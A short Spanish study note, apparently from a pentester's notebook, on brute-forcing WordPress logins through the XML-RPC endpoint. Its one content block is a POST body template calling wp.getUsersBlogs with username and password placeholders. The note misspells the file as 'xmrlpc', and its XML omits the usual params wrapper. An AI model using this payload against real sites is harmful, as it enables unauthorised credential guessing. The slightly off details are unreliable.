---

---

--------

-tags: #web #reconocimiento #wordpress 

------------------
Si quisiéramos aplicar fuerza bruta en [[WordPress]] para descubrir credenciales validas así como con la herramienta [[WpScan]] seria necesario aplicar por un método *POST* aprovechando las vías potenciales de un archivo xml en el **xmrlpc** como se muestra a continuación:

```xml
<methodCall>
	<methodName>wp.getUsersBlogs</methodName> 
	<param><value>{username}</value></param>
	<param><value>{password}</value></param>
</methodCall>
```




